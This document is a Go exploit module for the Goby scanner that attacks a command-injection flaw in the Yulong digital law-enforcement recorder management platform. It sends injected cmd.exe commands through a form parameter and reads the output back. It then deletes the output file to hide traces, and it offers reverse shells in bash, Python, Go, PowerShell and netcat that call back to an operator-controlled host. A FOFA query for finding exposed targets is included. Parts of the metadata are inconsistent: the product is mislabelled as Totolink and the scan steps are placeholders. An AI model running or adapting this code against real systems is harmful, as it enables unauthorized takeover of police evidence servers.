package exploits

import (
  "encoding/base64"
  "errors"
  "git.gobies.org/goby/goscanner/godclient"
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "net/url"
  "strings"
  "time"
  "unicode/utf16"
)

func init() {
  expJson := `{
    "Name": "Yulong Digital Law Enforcement Recorder Management Platform /index.php Command Execution Vulnerability",
    "Description": "<p>Yulong is committed to providing high-speed, stable and safe intelligent communication terminal products and solutions for customers in police law enforcement, emergency response, fire protection, energy, transportation and other government and enterprise industries, and the product line includes 5G/4G law enforcement recorders, explosion-proof intelligent terminals, public network walkie-talkies, video intercom recording all-in-one machines, 4G image transmission flashlights and other wearable intelligent hardware and law enforcement video and audio recording systems, integrated communication command and dispatch systems, mobile video and audio APP and other smart IoT solutions</p>",
    "Product": "Totolink-Company-Products",
    "Homepage": "https://www.yulongdt.com/int/about.html",
    "DisclosureDate": "2024-10-09",
    "PostTime": "2024-10-11",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"PView 视音频管理平台\" && title=\"PMedia Platform\"",
    "GobyQuery": "body=\"PView 视音频管理平台\" && title=\"PMedia Platform\"",
    "Level": "2",
    "Impact": "<p>An attacker can use bypass methods such as splicing, pipes, and wildcards to execute arbitrary commands on the server and write them to backdoors, thereby invading the server and obtaining server permissions, directly resulting in the server being compromised.</p>",
    "Recommendation": "<p>1. When calling the shell at the code level, change the special characters in the command line (such as |, &amp;amp;, ; etc.), etc.) to prevent the execution of other illegal orders. </p><p> 2. Verify the whitelist based on the business logic or use regular expressions for filtering.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/142317113#:~:text=%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E9%98%85%E8%AF%BB45"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershell",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "誉龙数字执法记录仪管理平台 /index.php 命令执行漏洞",
            "Product": "誉龙数字执法记录仪平台",
            "Description": "<p>誉龙致力于为警务执法、应急、消防、能源、交通等政企行业客户提供高速、稳定和安全的智能通信终端产品及解决方案，产品线包括5G/4G执法记录仪、防爆智能终端、公网对讲机、视频对讲记录一体机、4G图传手电筒等可穿戴智能硬件及执法视音频记录系统、融合通信指挥调度系统、移动视音频APP等智慧物联解决方案<br></p>",
            "Recommendation": "<p>1.在代码级调用shell时，对命令行中的特殊字符（比如|、&amp;amp;amp;、；等）进行转义，防止执行其他非法命令。2.根据业务逻辑进行白名单方式校验或使用正则表达式进行过滤。<br></p>",
            "Impact": "<p>攻击者可在服务器通过利用拼接、管道符、通配符等绕过手段来执行任意命令，写入后门，从而入侵服务器，获取服务器权限，直接导致服务器沦陷。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Yulong Digital Law Enforcement Recorder Management Platform /index.php Command Execution Vulnerability",
            "Product": "Totolink-Company-Products",
            "Description": "<p>Yulong is committed to providing high-speed, stable and safe intelligent communication terminal products and solutions for customers in police law enforcement, emergency response, fire protection, energy, transportation and other government and enterprise industries, and the product line includes 5G/4G law enforcement recorders, explosion-proof intelligent terminals, public network walkie-talkies, video intercom recording all-in-one machines, 4G image transmission flashlights and other wearable intelligent hardware and law enforcement video and audio recording systems, integrated communication command and dispatch systems, mobile video and audio APP and other smart IoT solutions<br></p>",
            "Recommendation": "<p>1. When calling the shell at the code level, change the special characters in the command line (such as |, &amp;amp;, ; etc.), etc.) to prevent the execution of other illegal orders.&nbsp;</p><p>&nbsp;2. Verify the whitelist based on the business logic or use regular expressions for filtering.<br></p>",
            "Impact": "<p>An attacker can use bypass methods such as splicing, pipes, and wildcards to execute arbitrary commands on the server and write them to backdoors, thereby invading the server and obtaining server permissions, directly resulting in the server being compromised.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9959"
}`
  setPayloadRequestHash_setWiFiAclRules_nE7mV4dA2lX4 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
    //command为原始命令，如果需编码，请自行编码后使用

    //漏洞url地址
    vulURL := "/index.php?r=Third/TimeSyn"
    requestConfig := httpclient.NewPostRequestConfig(vulURL)
    requestConfig.VerifyTls = false
    requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
    requestConfig.FollowRedirect = false
    tmpFileName := ""

    tmpFileName = goutils.RandomHexString(6) + ".txt"
    command = command + `+>+` + tmpFileName
    payload := "cloudKey=0x0&date=|cmd.exe+/c+" + command + " &time=1"
    requestConfig.Data = payload
    resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
    if err != nil || resp.StatusCode != 200 {
      err = errors.New("failed to RCE")
      return "", vulURL, err
    }
    commandResult := ""
    GetrequestConfig := httpclient.NewGetRequestConfig("/" + tmpFileName)
    GetrequestConfig.VerifyTls = false
    GetrequestConfig.FollowRedirect = false
    Getresp, err := httpclient.DoHttpRequest(hostInfo, GetrequestConfig)
    if err != nil || Getresp.StatusCode != 200 {
      err = errors.New("failed to read file")
      return "", vulURL, err
    }
    commandResult = Getresp.RawBody
    //清理痕迹
    payload = "cloudKey=0x0&date=|cmd.exe+/c+del+" + tmpFileName + " &time=1"
    requestConfig.Data = payload
    httpclient.DoHttpRequest(hostInfo, requestConfig)
    //vulURL = "/" + tmpFileName
    return commandResult, vulURL, nil
  }

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    //poc验证函数
    func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      //setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
      runPayload := setPayloadRequestHash_setWiFiAclRules_nE7mV4dA2lX4

      text := goutils.RandomHexString(16)
      pocCommand := `echo ` + text

      pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
      if err != nil {
        return false
      }
      if strings.Contains(pocRuselt, text) {
        ss.VulURL = hostInfo.HostInfo + pocUrl
        return true
      }

      return false
    },
    //exp利用函数
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      //setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
      runPayload := setPayloadRequestHash_setWiFiAclRules_nE7mV4dA2lX4

      setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
        select {
        case webConsleID := <-waitSessionCh:
          if u, err := url.Parse(webConsleID); err == nil {
            expResult.Success = true
            expResult.OutputType = "html"
            sid := strings.Join(u.Query()["id"], "")
            expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
          } else {
            expResult.Success = false
            expResult.Output = "reverse shell fail"
          }
        case <-time.After(time.Second * 25):
        }
      }

      setReverseRequest := func(reverseType string) (string, chan string, error) {
        ReverseTcpByPython := func(rp string) string {
          return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
        }
        ReverseTcpByGo := func(rp string) string {
          return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
        }
        typeList := map[string]func(string) string{
          "ByBash":             godclient.ReverseTCPByBash,
          "ByBashBase64":       godclient.ReverseTCPByBash,
          "ByPowershell":       godclient.ReverseTCPByPowershell,
          "ByPowershellBase64": godclient.ReverseTCPByPowershell,
          "BySh":               godclient.ReverseTCPBySh,
          "ByNcBsd":            godclient.ReverseTCPByNcBsd,
          "ByPython":           ReverseTcpByPython,
          "ByGo":               ReverseTcpByGo,
        }
        if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
          return "", nil, errors.New("vaild exsploit")
        }
        waitSessionCh := make(chan string)

        if strings.Contains(reverseType, "ByPowershell") {
          if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
            command := typeList[reverseType](rp)
            if reverseType == "ByPowershellBase64" {
              utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
              bytes := make([]byte, len(utf16Bytes)*2)
              for i, v := range utf16Bytes {
                bytes[i*2] = byte(v)
                bytes[i*2+1] = byte(v >> 8)
              }
              command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
            }
            return command, waitSessionCh, nil
          }
        } else {
          if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
            command := typeList[reverseType](rp)
            if reverseType == "ByBashBase64" {
              command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
            }
            return command, waitSessionCh, nil
          }
        }
        return "", waitSessionCh, errors.New("gain command fail")
      }

      attackType := goutils.B2S(ss.Params["attackType"])
      switch attackType {
      case "cmd":
        //配置命令
        command := goutils.B2S(ss.Params["cmd"])
        Result, _, err := runPayload(expResult.HostInfo, command)

        if err != nil {
          expResult.Success = false
          expResult.Output = err.Error()
          return expResult
        }

        if len(Result) > 0 {
          expResult.Success = true
          expResult.Output = Result
        } else {
          expResult.Success = false
          expResult.Output = err.Error()
        }
      case "reverse":
        //配置反弹shell的类型
        reversetype := goutils.B2S(ss.Params["reverse"])

        if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
          go runPayload(expResult.HostInfo, command)
          setReverseWaitting(expResult, waitSessionCh)
        } else {
          expResult.Success = false
          expResult.Output = err.Error()
        }
      default:
        expResult.Success = false
        expResult.Output = `未知的利用方式`
      }
      return expResult
    },
  ))
}
